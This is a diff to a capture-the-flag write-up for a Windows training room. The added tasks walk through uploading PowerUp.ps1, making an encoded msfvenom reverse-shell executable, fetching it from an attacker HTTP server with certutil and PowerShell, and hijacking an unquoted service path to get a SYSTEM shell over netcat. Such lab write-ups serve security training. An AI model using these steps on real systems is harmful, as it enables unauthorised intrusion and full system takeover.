@@ -46,7 +46,7 @@ Do an nmap scan `nmap -sC -sV $IP` and the scan result will lead you to the answ
     49163/tcp open  msrpc              Microsoft Windows RPC
     Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-To find the name of the file server, just go to $IP:8080 and take note of the create url of the file server.
+To find the name of the file server, just go to $IP:8080 and look for an url that link to the creator's website.
 
 Run `searchsploit rejetto http file server 2.3 -w` to find the answer for the CVE number.
 
@@ -108,11 +108,58 @@ To run the exploit, just type `run` or `exploit` and wait patiently until you se
 
     meterpreter > 
 
-Go to C:\users\bill\desktop and `type user.txt` to get the flag for the last question
+Go to C:\users\bill\desktop and `cat user.txt` to get the flag for the last question
 
 # Task 3 Privilege Escalation 
 
-Just follow the instrcution and use metasploit to continue with the studies.
+Upload the powerup.ps1 script to the target machine with the following command
+
+    meterpreter > upload ~/thm/steelmountain/powerup.ps1
+    [*] uploading  : /home/kali/thm/steelmountain/powerup.ps1 -> powerup.ps1
+    [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/thm/steelmountain/powerup.ps1 -> powerup.ps1
+    [*] uploaded   : /home/kali/thm/steelmountain/powerup.ps1 -> powerup.ps1
+    
+Load powershell in meterpreter and run the script you have just uploaded.
+
+    ServiceName    : AdvancedSystemCareService9
+    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+    StartName      : LocalSystem
+    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+    CanRestart     : True
+    Name           : AdvancedSystemCareService9
+    Check          : Unquoted Service Paths
+
+The above is the only service with `true` for canRestart
+
+Create the payload with the command `msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe`
+
+    $ msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe                                                                                                    2 ⨯
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x86 from the payload
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+    x86/shikata_ga_nai chosen with final size 351
+    Payload size: 351 bytes
+    Final size of exe file: 73802 bytes
+    Saved as: Advanced.exe
+
+Upload the payload to C:\Program Files (x86)\IObit then setup a netcat session. Afterwards stop the service with `sc stop AdvancedSystemCareService9` and start the service with `sc start AdvancedSystemCareService9`
+
+    $ nc -nvlp 1234
+    listening on [any] 1234 ...
+    connect to [10.11.56.137] from (UNKNOWN) [10.10.203.213] 49266
+    Microsoft Windows [Version 6.3.9600]
+    (c) 2013 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+
+    C:\Windows\system32>
+
+Read the root.txt for the flag
 
 # Task 4 Access and Escalation Without Metasploit (python3 friendly)
 
@@ -121,3 +168,51 @@ For this task, in the latest release of python, urllib2 is gone and hence we nee
 `2to3 39161.py -w` this will create a backup of the original script and rewrite the script to python version3. If you do not have 2to3 in your machine, just install it `sudo apt install 2to3`
 
 By now you should be ready with the new script. Go to the folder which stored `nc.exe` and start a simple HTTP server `python3 -m http.server 80` (take note the default port is 8000 if unspecified) and listen to a port of your choice with `nc` and then try running the script twice as instructed. You should be able to get a callback.
+
+The next step is to get `winPEASx64.exe` to the target machine. Create a tmp folder `mkdir tmp` and download winPEASx64.exe to this folder with the command `certutil -urlcache -f http://$IP/winPEASx64.exe winPEASx64.exe`, run `winPEASx64 servicesinfo` and you will get the result as below
+
+    ����������͹ Interesting Services -non Microsoft-
+    � Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+        AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
+        File Permissions: bill [WriteData/CreateFiles]
+        Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
+        Advanced SystemCare Service
+       =================================================================================================
+
+
+We can reuse the payload generated from task 3.
+
+Go to `C:\Program Files (x86)\IObit` then donwload the payload with the command `powershell -c iwr -uri http://$IP/Advanced.exe -outfile Advanced.exe`
+
+    C:\Program Files (x86)\IObit>powershell -c iwr -uri http://$IP/Advanced.exe
+    powershell -c iwr -uri http://$IP/Advanced.exe
+
+
+    StatusCode        : 200
+    StatusDescription : OK
+    Content           : {77, 90, 144, 0...}
+    RawContent        : HTTP/1.0 200 OK
+                        Content-Length: 73802
+                        Content-Type: application/x-msdos-program
+                        Date: Tue, 29 Mar 2022 03:02:40 GMT
+                        Last-Modified: Sun, 27 Mar 2022 13:01:21 GMT
+                        Server: SimpleHTTP/0.6 Python/3.9....
+    Headers           : {[Content-Length, 73802], [Content-Type, 
+                        application/x-msdos-program], [Date, Tue, 29 Mar 2022 
+                        03:02:40 GMT], [Last-Modified, Sun, 27 Mar 2022 13:01:21 
+                        GMT]...}
+    RawContentLength  : 73802
+
+Setup a netcat session and listen to the port you had specified in the payload `nc -nvlp 1234`. Stop and start the service and you should get SYSTEM level access
+
+    $ nc -nvlp 1234
+    listening on [any] 1234 ...
+    connect to [$IP] from (UNKNOWN) [10.10.0.244] 49257
+    Microsoft Windows [Version 6.3.9600]
+    (c) 2013 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+
+    C:\Windows\system32>
